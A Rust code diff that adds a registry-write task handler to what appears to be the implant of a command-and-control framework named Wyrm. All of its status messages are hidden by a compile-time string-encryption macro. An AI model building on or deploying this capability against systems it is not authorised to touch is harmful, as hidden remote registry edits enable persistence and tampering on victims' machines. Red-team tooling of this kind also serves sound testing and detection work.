@@ -1,10 +1,12 @@
 use std::slice::from_raw_parts;
 
 use serde::Serialize;
-use shared::{task_types::RegQueryInner, tasks::WyrmResult};
+use shared::{
+    task_types::{RegAddInner, RegQueryInner, RegType},
+    tasks::WyrmResult,
+};
 use str_crypter::{decrypt_string, sc};
 use windows_registry::{CLASSES_ROOT, CURRENT_USER, Key, LOCAL_MACHINE, Transaction, USERS, Value};
-use windows_sys::Win32::Foundation::GetLastError;
 
 #[cfg(debug_assertions)]
 use shared::pretty_print::print_failed;
@@ -24,6 +26,101 @@ pub fn reg_query(raw_input: &Option<String>) -> Option<impl Serialize> {
     } else {
         return query_key(input_deser.0);
     }
+}
+
+pub fn reg_add(raw_input: &Option<String>) -> Option<impl Serialize> {
+    let (path, value, data, reg_type) = match raw_input {
+        Some(s) => match serde_json::from_str::<RegAddInner>(s) {
+            Ok(s) => s,
+            Err(_) => todo!(),
+        },
+        None => todo!(),
+    };
+
+    let (opened, path_stripped) = match get_key_strip_hive(&path) {
+        Some((k, p)) => (k, p),
+        None => {
+            return Some(WyrmResult::Err::<String>(
+                sc!("Bad data - could not find matching hive.", 162).unwrap(),
+            ));
+        }
+    };
+
+    //
+    // Do the operation
+    //
+    if let Ok(tx) = Transaction::new() {
+        // Try open the key
+        let opened = match opened
+            .options()
+            .read()
+            .write()
+            .create()
+            .transaction(&tx)
+            .open(&path_stripped)
+        {
+            Ok(o) => o,
+            Err(e) => {
+                return Some(WyrmResult::Err::<String>(format!(
+                    "{} {e}",
+                    sc!("Could not open key as read/write.", 162).unwrap()
+                )));
+            }
+        };
+
+        // Set the value depending on the input type
+        let reg_set_op_res = match reg_type {
+            RegType::String => opened.set_string(&value, data.clone()),
+            RegType::U32 => {
+                let data_u32: u32 = match data.clone().parse() {
+                    Ok(d) => d,
+                    Err(e) => {
+                        return Some(WyrmResult::Err::<String>(format!(
+                            "{} {e}",
+                            sc!("Could not parse input to u64.", 162).unwrap()
+                        )));
+                    }
+                };
+                opened.set_u32(&value, data_u32)
+            }
+            RegType::U64 => {
+                let data_u64: u64 = match data.clone().parse() {
+                    Ok(d) => d,
+                    Err(e) => {
+                        return Some(WyrmResult::Err::<String>(format!(
+                            "{} {e}",
+                            sc!("Could not parse input to u64.", 162).unwrap()
+                        )));
+                    }
+                };
+                opened.set_u64(&value, data_u64)
+            }
+        };
+
+        // Check if the above was successful
+        if let Err(e) = reg_set_op_res {
+            return Some(WyrmResult::Err::<String>(format!(
+                "{} {path} {value} {e}",
+                sc!("Error whilst trying to set registry value.", 162).unwrap()
+            )));
+        }
+
+        // Make the transaction
+        if let Err(e) = tx.commit() {
+            return Some(WyrmResult::Err::<String>(format!(
+                "{} {e}",
+                sc!("Error committing registry transaction.", 167).unwrap()
+            )));
+        }
+
+        return Some(WyrmResult::Ok::<String>(
+            sc!("Successfully modified registry.", 135).unwrap(),
+        ));
+    }
+
+    return Some(WyrmResult::Err::<String>(
+        sc!("Could not create transaction.", 168).unwrap(),
+    ));
 }
 
 fn query_key_plus_value(path: String, value: String) -> Option<WyrmResult<String>> {
@@ -108,13 +205,7 @@ fn query_key(path: String) -> Option<WyrmResult<String>> {
     }
 
     if constructed.is_empty() {
-        return Some(WyrmResult::Err(
-            sc!(
-                "Could not find data, it is possible there was an unknown error.",
-                71
-            )
-            .unwrap(),
-        ));
+        return Some(WyrmResult::Ok(sc!("No data in key.", 71).unwrap()));
     }
 
     match serde_json::to_string(&constructed) {
